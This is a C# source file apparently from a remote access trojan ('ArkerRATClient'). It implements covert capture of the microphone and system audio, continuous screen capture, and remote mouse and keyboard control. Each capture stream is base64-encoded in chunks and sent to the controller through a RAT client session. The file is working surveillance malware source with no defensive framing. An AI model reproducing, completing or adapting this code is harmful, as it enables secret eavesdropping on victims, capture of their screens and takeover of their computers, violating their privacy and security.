
using ArkerRATClient;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using NAudio.CoreAudioApi;
using NAudio.Wave;

namespace ARKERRATCLIENT2._0
{
    public static class RemoteDesktop
    {
        public static bool sendingFrames = false;
        private const int ChunkSize = 32768; 

        public static async void StartAudioStreaming()
        {
            WaveInEvent microphoneWaveInEvent = new WaveInEvent();
            microphoneWaveInEvent.WaveFormat = new WaveFormat(41100, 1);

            WasapiLoopbackCapture speakerWaveInEvent = new WasapiLoopbackCapture();
            speakerWaveInEvent.WaveFormat = microphoneWaveInEvent.WaveFormat;

            microphoneWaveInEvent.DataAvailable += (sender, args) =>
            {
                Task.Run(async () =>
                {
                    byte[] audioData = new byte[args.BytesRecorded];
                    Buffer.BlockCopy(args.Buffer, 0, audioData, 0, args.BytesRecorded);
                    string base64Audio = Convert.ToBase64String(audioData);
                    const int ChunkSize = 10000; // Adjust the chunk size as needed
                    for (int i = 0; i < base64Audio.Length; i += ChunkSize)
                    {
                        int remainingBytes = Math.Min(ChunkSize, base64Audio.Length - i);
                        string chunk = base64Audio.Substring(i, remainingBytes);
                        string audioChunk = "§RemoteDesktopStart§" + "§IA§" + chunk + "§RemoteDesktopEnd§";
                        RATClientSession.SendData(audioChunk).Wait(); // Use .Wait() to block the async method

                    }
                });

            };

            speakerWaveInEvent.DataAvailable += (sender, args) =>
            {
                Task.Run(async () =>
                {
                    byte[] audioData = new byte[args.BytesRecorded];
                    Buffer.BlockCopy(args.Buffer, 0, audioData, 0, args.BytesRecorded);
                    string base64Audio = Convert.ToBase64String(audioData);
                    const int ChunkSize = 10000; // Adjust the chunk size as needed
                    for (int i = 0; i < base64Audio.Length; i += ChunkSize)
                    {
                        int remainingBytes = Math.Min(ChunkSize, base64Audio.Length - i);
                        string chunk = base64Audio.Substring(i, remainingBytes);
                        string audioChunk = "§RemoteDesktopStart§" + "§OA§" + chunk + "§RemoteDesktopEnd§";
                        RATClientSession.SendData(audioChunk).Wait(); // Use .Wait() to block the async method
                    }
                });
            };

            microphoneWaveInEvent.StartRecording();
            speakerWaveInEvent.StartRecording();

            while (sendingFrames && !RATClientSession.noConnection)
            {
                await Task.Delay(10);
            }

            microphoneWaveInEvent.StopRecording();
            microphoneWaveInEvent.Dispose();

            speakerWaveInEvent.StopRecording();
            speakerWaveInEvent.Dispose();
        }



        public static async Task StartScreenStreaming(int quality)
        {
            while (sendingFrames && !RATClientSession.noConnection)
            {
                Bitmap screenshot = CaptureScreenshot(quality);
                List<string> chunks = ConvertToBase64Chunks(screenshot, quality);
                await SendChunks(chunks);
                await Task.Delay(1);
            }
        }


        private static Bitmap CaptureScreenshot(int quality)
        {
            int desiredWidth = Screen.PrimaryScreen.Bounds.Width;
            int desiredHeight = Screen.PrimaryScreen.Bounds.Height;

            Bitmap screenshot = new Bitmap(desiredWidth, desiredHeight);

            using (Graphics graphics = Graphics.FromImage(screenshot))
            {
                graphics.CopyFromScreen(0, 0, 0, 0, screenshot.Size);
            }

            return screenshot;
        }

        private static List<string> ConvertToBase64Chunks(Bitmap image, int quality)
        {
            List<string> chunks = new List<string>();
            using (MemoryStream memoryStream = new MemoryStream())
            {
                EncoderParameters encoderParameters = new EncoderParameters(1);
                encoderParameters.Param[0] = new EncoderParameter(Encoder.Quality, quality);

                ImageCodecInfo jpegCodec = GetEncoderInfo(ImageFormat.Jpeg);

                image.Save(memoryStream, jpegCodec, encoderParameters);

                byte[] imageBytes = memoryStream.ToArray();
                for (int i = 0; i < imageBytes.Length; i += ChunkSize)
                {
                    int remainingBytes = Math.Min(ChunkSize, imageBytes.Length - i);
                    byte[] chunk = new byte[remainingBytes];
                    Array.Copy(imageBytes, i, chunk, 0, remainingBytes);

                    string base64Chunk = Convert.ToBase64String(chunk);
                    chunks.Add(base64Chunk);
                }
            }

            return chunks;
        }

        private static async Task SendChunks(List<string> chunks)
        {
            foreach (string chunk in chunks)
            {
                await RATClientSession.SendData("§RemoteDesktopStart§" + chunk + "§RemoteDesktopEnd§");
            }
            await RATClientSession.SendData("§RemoteDesktopStart§§RemoteDesktopFrameDone§§RemoteDesktopEnd§");
        }

        private static ImageCodecInfo GetEncoderInfo(ImageFormat format)
        {
            ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
            foreach (ImageCodecInfo codec in codecs)
            {
                if (codec.FormatID == format.Guid)
                {
                    return codec;
                }
            }
            return null;
        }

        //CHAT GPT EMULATE CLICK
        public static void EmulateClick(string clickData)
        {
            int delta;

            //Should sort out the delimiter properly sometime idk when dont use replace :(

            string[] cordinates = clickData.Replace("§ClickPositionStart§", string.Empty).Replace("§ClickPositionEnd§", string.Empty).Split(',');
            int x = int.Parse(cordinates[0].Split('.')[0]);
            int y = int.Parse(cordinates[1].Split('.')[0]);

            Cursor.Position = new Point(x, y);
            if (cordinates[2] == "Left")
            {
                MouseHelper.MouseEvent(MouseHelper.MouseEventFlags.LeftDown | MouseHelper.MouseEventFlags.LeftUp);
            }
            else if (cordinates[2] == "Right")
            {
                MouseHelper.MouseEvent(MouseHelper.MouseEventFlags.RightDown | MouseHelper.MouseEventFlags.RightUp);
            }
            else if (int.TryParse(cordinates[2], out delta))
            {
                // Scrolling up
                if (delta > 0)
                {
                    for (int i = 0; i < delta; i++)
                    {
                        MouseHelper.MouseEvent(MouseHelper.MouseEventFlags.Wheel, 1);
                    }
                }
                // Scrolling down
                else if (delta < 0)
                {
                    for (int i = 0; i > delta; i--)
                    {
                        MouseHelper.MouseEvent(MouseHelper.MouseEventFlags.Wheel, -1);
                    }
                }
            }
            else
            {
                return;
            }

            // Emulate the mouse click
        }

        public static class MouseHelper
        {
            [DllImport("user32.dll")]
            public static extern void mouse_event(MouseEventFlags flags, int dx, int dy, int data, UIntPtr extraInfo);

            [Flags]
            public enum MouseEventFlags : uint
            {
                LeftDown = 0x00000002,
                LeftUp = 0x00000004,
                MiddleDown = 0x00000020,
                MiddleUp = 0x00000040,
                RightDown = 0x00000008,
                RightUp = 0x00000010,
                Wheel = 0x00000800,
                XDown = 0x00000080,
                XUp = 0x00000100,
                Move = 0x00000001,
                Absolute = 0x00008000,
                HWheel = 0x00001000
            }

            public static void MouseEvent(MouseEventFlags flags, int data = 0)
            {
                mouse_event(flags, 0, 0, data, UIntPtr.Zero);
            }
        }

        public static void EmulateKeyStrokes(string keystroke)
        {
            //ADD MORE KEYSTROKE SOMETIME

            if (keystroke == "tab")
            {
                SendKeys.SendWait("{TAB}");
            }
            else if (keystroke == "oemperiod")
            {
                SendKeys.SendWait(".");
            }
            else if (keystroke == "leftshift")
            {
                SendKeys.SendWait("+");
            }
            else if (keystroke == "back")
            {
                SendKeys.SendWait("{BACKSPACE}");
            }
            else if (keystroke == "space")
            {
                SendKeys.SendWait(" ");
            }
            else if (keystroke == "return")
            {
                SendKeys.SendWait("{ENTER}");
            }
            else if (keystroke == "leftctrl")
            {
                SendKeys.SendWait("{CTRL}");
            }
            else if (keystroke == "system")
            {
                SendKeys.SendWait("{ALT}");
            }
            else
            {
                SendKeys.SendWait(keystroke);
            }
        }
    }
}
